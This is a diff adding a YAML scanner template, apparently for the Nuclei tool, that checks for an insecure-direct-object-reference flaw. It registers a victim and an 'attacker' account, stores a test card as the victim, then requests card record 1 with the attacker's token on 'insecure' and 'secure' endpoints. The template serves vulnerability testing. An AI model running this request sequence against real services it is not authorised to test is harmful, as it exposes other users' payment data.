@@ -1,0 +1,103 @@
+id: primary-key-idor
+info:
+  name: Primary Key Based IDOR
+  severity: high
+  description: Scan for Primary Key Based IDOR
+
+
+requests:
+  - raw:
+    - |
+        POST /create-user HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"user@corp.com","password":"Hello1234"}
+
+  - raw:  
+    - |
+        POST /create-user HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"attacker@corp.com","password":"Hello123"}
+
+  - raw:  
+    - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"user@corp.com","password":"Hello1234"}
+
+    - |
+        POST /create-card HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{udata}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"card_num":411111111111,"cvv":211,"exp":1224}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: udata
+        regex:
+          - 'eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}'
+
+  - raw:  
+    - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"attacker@corp.com","password":"Hello123"}
+
+    - |
+        GET /insecure/get-card/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{adata}}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: adata
+        regex:
+          - 'eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "card_number"
+
+  - raw:  
+    - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"attacker@corp.com","password":"Hello123"}
+
+    - |
+        GET /secure/get-card/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: {{adata}}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: adata
+        regex:
+          - 'eyJ[a-zA-Z0-9]{10,}\.eyJ[a-zA-Z0-9]{10,}\.[a-zA-Z0-9_\-]{10,}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "card_number"
